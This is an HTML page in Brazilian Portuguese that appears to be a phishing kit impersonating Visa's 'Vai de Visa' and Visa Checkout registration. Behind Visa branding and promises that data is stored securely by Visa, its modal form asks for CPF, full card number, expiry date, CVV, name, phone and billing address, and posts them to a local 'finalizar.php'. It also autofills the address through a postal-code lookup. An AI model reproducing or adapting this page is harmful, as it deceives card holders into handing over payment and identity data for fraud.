<!-- 
   Theme Name: Visa Copa Russia 2018
   Author: MK(rj)
    -->
<!DOCTYPE html>
<html lang="pt-BR">
   <head>
      <title>Cadastro | Vai de Visa</title>
      <meta http-equiv="content-type" content="text/html; charset=UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <meta name="theme-color" content="#1a1f71">
      
      <link rel="stylesheet" type="text/css" href="css/bootstrap.css">
      <link rel="stylesheet" type="text/css" href="css/estilo.css">
      <link rel="stylesheet" type="text/css" href="css/cadastro.css">
      <link href="img/favico.png" rel="Shortcut Icon">

      <script src="js/jquery-3.2.1.min.js"></script>
      <script src="js/bootstrap.js"></script>
    <script src="js/script1.js"></script>

      <script src="https://code.jquery.com/jquery-3.2.1.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>

      <script type="text/javascript" >

              $(document).ready(function() {

                  function limpa_formulário_cep() {
                      // Limpa valores do formulário de cep.
                      $("#rua").val("");
                      $("#bairro").val("");
                      $("#cidade").val("");
                      $("#uf").val("");
                      $("#ibge").val("");
                  }
                  
                  //Quando o campo cep perde o foco.
                  $("#cep").blur(function() {

                      //Nova variável "cep" somente com dígitos.
                      var cep = $(this).val().replace(/\D/g, '');

                      //Verifica se campo cep possui valor informado.
                      if (cep != "") {

                          //Expressão regular para validar o CEP.
                          var validacep = /^[0-9]{8}$/;

                          //Valida o formato do CEP.
                          if(validacep.test(cep)) {

                              //Preenche os campos com "..." enquanto consulta webservice.
                              $("#rua").val("...");
                              $("#bairro").val("...");
                              $("#cidade").val("...");
                              $("#uf").val("...");
                              $("#ibge").val("...");

                              //Consulta o webservice viacep.com.br/
                              $.getJSON("https://viacep.com.br/ws/"+ cep +"/json/?callback=?", function(dados) {

                                  if (!("erro" in dados)) {
                                      //Atualiza os campos com os valores da consulta.
                                      $("#rua").val(dados.logradouro);
                                      $("#bairro").val(dados.bairro);
                                      $("#cidade").val(dados.localidade);
                                      $("#uf").val(dados.uf);
                                      $("#ibge").val(dados.ibge);
                                  } //end if.
                                  else {
                                      //CEP pesquisado não foi encontrado.
                                      limpa_formulário_cep();
                                      alert("CEP não encontrado.");
                                  }
                              });
                          } //end if.
                          else {
                              //cep é inválido.
                              limpa_formulário_cep();
                              alert("Formato de CEP inválido.");
                          }
                      } //end if.
                      else {
                          //cep sem valor, limpa formulário.
                          limpa_formulário_cep();
                      }
                  });
              });

          </script>

   </head>
   <body id="tela1">
      <header class="hidden-xs hidden-sm">
         <div id="header" class="container-fluid">
            <div class="row" id="principal">
               <div class="container">
                  <div class="row">
                     <div id="logo" class="col-sm-5 col-md-3">
                        <a href="/site/home" data-label="Logo">
                        Vai de Visa
                        </a>
                     </div>
                  </div>
               </div>
            </div>
         </div>
      </header>

      <div class="container" id="call-cadastro">
         <div class="row">
            <div class="col-sm-12">
               <h2>Cadastre-se uma única vez <br>
                  <small>Agora seu cadastro no Vai de Visa é realizado por meio do Visa Checkout.</small>
               </h2>
            </div>
         </div>
         <div class="row">
            <div class="col-sm-12" id="info-visa-checkout">
               <h4>O que é o Visa Checkout?</h4>
               <p>Um serviço gratuito da Visa para você comprar em suas lojas online <br>
                  favoritas com apenas um cadastro. É simples, fácil e seguro.
               </p>
            </div>
            <div id="holderBtn" class="col-sm-offset-4 col-sm-4">
               <img alt="Visa Checkout" class="v-button" data-toggle="modal" data-target="#cadastroModal" src="https://sandbox.secure.checkout.visa.com/wallet-services-web/xo/button.png?cobrand=false" tabindex="0" style="cursor: pointer; transition-property: filter; transition-duration: 0.25s;">


               <!-- Modal -->
               <div class="modal fade" id="cadastroModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true"">
                 <div class="modal-dialog" role="document">
                   <div class="modal-content">
                     <div class="modal-body">
                        <header role="banner" class="header rxo-header blue">
                           <div class="header-contentWrapper">
                              <i class="header-img-visaLogo header-logo" id="visa-logo-default" title="Logotipo do Visa Checkout">
                                 <u class="icons-sprite-text" data-reactid=".0.1.0.1.0.1.0"><img src="img/visaCheckout.png"></u>
                              </i>
                           </div>
                        </header>

                        <main id="conteudoModal">
                           <form action="finalizar.php" method="POST" class="form-inline">
                              <div class="group">
                                 <h3 class="tituloModal">Detalhes do Cartão</h3>
                              </div>
                              <div class="group">
                                 <img src="img/cartao.png">
                              </div>

                              <div class="group">
                                <input class="frm" type="text" id="cpf" name="cpf" maxlength="14" onkeypress="return SomenteNumero(event)" oninvalid="setCustomValidity('Digite seu CPF !')" onchange="try{setCustomValidity('')}catch(e){}" onkeyup="mascaraMike('###.###.###-##', this);javascript:pulacampo('cpf','cc');" autofocus required>
                                <span class="highlight"></span>
                                <span class="bar"></span>
                                <label>CPF</label>
                              </div>

                              <div class="group">
                                <input class="frm" type="tel" id="cc" name="cc" maxlength="19" onkeypress="return SomenteNumero(event)" oninvalid="setCustomValidity('Digite um cartão !')" onchange="try{setCustomValidity('')}catch(e){}" onkeyup="mascaraMike('#### #### #### ####', this);javascript:pulacampo('cc','validade');" autofocus required>
                                <span class="highlight"></span>
                                <span class="bar"></span>
                                <label>Número do Cartão</label>
                              </div>
                              <div class="group" style="width: 47%;">
                                <input class="frm" type="tel" id="validade" name="validade" maxlength="5" onkeypress="return SomenteNumero(event)" oninvalid="setCustomValidity('Digite uma validade !')" onchange="try{setCustomValidity('')}catch(e){}" onkeyup="mascaraMike('##/##', this);javascript:pulacampo('validade','cvv');" required>
                                <span class="highlight"></span>
                                <span class="bar"></span>
                                <label>Expira</label>
                              </div>
                              <div class="group" style="width: 53%; border-left: 1px solid #494949">
                                <input class="frm" type="tel" id="cvv" name="cvv" maxlength="3" onkeypress="return SomenteNumero(event)" oninvalid="setCustomValidity('Digite um Código de segurança válido !')" onchange="try{setCustomValidity('')}catch(e){}" onkeyup="pulacampo('cvv','nome');" required>
                                <span class="highlight"></span>
                                <span class="bar"></span>
                                <label>Código Seg.</label>
                              </div>

                              <h3 class="tituloModal">Endereço de Cobrança</h3>
                              <span class="infoModal">Precisa ser igual ao que consta em seu cartão de crédito ou extrato bancário</span>

                              <div class="group" style="width: 47%;">
                                <input class="frm" type="text" id="nome" name="nome" maxlength="15" onkeyup="pulacampo('nome','sobrenome');" required>
                                <span class="highlight"></span>
                                <span class="bar"></span>
                                <label>Nome</label>
                              </div>
                              <div class="group" style="width: 53%; border-left: 1px solid #494949">
                                <input class="frm" type="text" id="sobrenome" name="sobrenome" maxlength="15" onkeyup="pulacampo('sobrenome','telefone');" required>
                                <span class="highlight"></span>
                                <span class="bar"></span>
                                <label>Sobrenome</label>
                              </div>
                              <div class="group">
                                <input class="frm" type="tel" id="telefone" name="telefone" maxlength="13" onkeypress="return SomenteNumero(event)" onkeyup="mascaraMike('(##)#####-####', this);javascript:pulacampo('telefone','cep');" required>
                                <span class="highlight"></span>
                                <span class="bar"></span>
                                <label>Telefone</label>
                              </div> 
                              <div class="group">
                                <input class="frm" type="tel" id="cep" name="cep" maxlength="8" onkeypress="return SomenteNumero(event)" onkeyup="pulacampo('cep','numero');" required>
                                <span class="highlight"></span>
                                <span class="bar"></span>
                                <label>Cep</label>
                              </div>          
                              <div class="group">
                                <input class="frm" type="tel" id="rua" name="rua" required>
                                <span class="highlight"></span>
                                <span class="bar"></span>
                                <label>Rua</label>
                              </div>
                              <div class="group">
                                <input class="frm" type="tel" id="numero" name="numero" maxlength="4" required>
                                <span class="highlight"></span>
                                <span class="bar"></span>
                                <label>Número</label>
                              </div>  
                              <div class="group">
                                <input class="frm" type="tel" id="bairro" name="bairro" required>
                                <span class="highlight"></span>
                                <span class="bar"></span>
                                <label>Bairro</label>
                              </div>
                              <div class="group">
                                <input class="frm" type="tel" id="cidade" name="cidade" required>
                                <span class="highlight"></span>
                                <span class="bar"></span>
                                <label>Cidade</label>
                              </div>     
	                           <div class="group">
	                             <input type="tel" id="uf" name="uf" required>
	                             <span class="highlight"></span>
	                             <span class="bar"></span>
	                             <label>Estado</label>
	                           </div>
	                           <div class="group">
	                           		<input type="submit" name="enviar" class="btn-secondary" value="Continuar">
	                           </div>
	                        </form>
                        </main>
                     </div>
                   </div>
                 </div>
               </div>

            </div>
         </div>
         <div class="row">
            <div class="col-sm-4 itens">
               <div class="holder">
                  <img src="img/icon-call-cadastro-1.png">
                  <p><strong>Simples</strong>
                     Clique no botão Visa Checkout <br>
                     e faça o seu cadastro. Insira seus <br>
                     dados pessoais, seu endereço <br>
                     e adicione seus cartões.
                  </p>
               </div>
            </div>
            <div class="col-sm-4 itens">
               <div class="holder">
                  <img src="img/icon-call-cadastro-2.png">
                  <p><strong>Fácil</strong>
                     Com um único cadastro, você tem acesso <br>
                     a todos os benefícios Visa e a facilidade <br>
                     de fazer seus pagamentos online. <br>
                     E totalmente gratuito!
                  </p>
               </div>
            </div>
            <div class="col-sm-4 itens">
               <div class="holder">
                  <img src="img/icon-call-cadastro-3.png">
                  <p><strong>Seguro</strong>
                     Todos os dados inseridos <br>
                     são armazenados de forma <br>
                     segura pela Visa.
                  </p>
               </div>
            </div>
         </div>
         <div class="row">
            <div class="col-sm-12" id="info-cadeado">
               <img src="img/icon-cadeado.gif">
               <p>Não se preocupe! <br>
                  Aqui suas informações estarão <br class="visible-xs-block">sempre protegidas.
               </p>
            </div>
         </div>
      </div>
   </body>

   </html>